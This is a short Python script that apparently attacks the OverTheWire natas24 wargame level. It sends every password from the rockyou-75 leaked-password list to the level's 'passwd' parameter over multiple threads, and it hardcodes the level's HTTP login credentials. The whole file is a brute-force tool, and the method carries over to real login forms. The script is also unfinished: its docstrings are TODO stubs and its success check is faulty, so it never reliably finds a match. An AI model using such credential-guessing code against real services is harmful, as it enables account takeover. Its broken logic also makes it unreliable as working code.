#! /usr/bin python

import requests
import concurrent.futures

passwords = '/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt'

username = 'natas24'
password= 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = 'http://natas24.natas.labs.overthewire.org/index.php?passwd='

session = requests.Session()

def get_response(passwd):
    """TODO: make this function supply the password to the request

    :passwd: TODO
    :returns: TODO

    """
    print(passwd[:-2].decode())

    # print(session.get(url+passwd[:-2].decode(), auth=(username, password)).text)
    return session.get(url+passwd[:-2].decode(), auth=(username, password)).text


passList = open(passwords, 'rb')

with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    result = executor.map(get_response,passList.readlines())

    if "credentials" in result:
        print(result)
        exit()

passList.close()
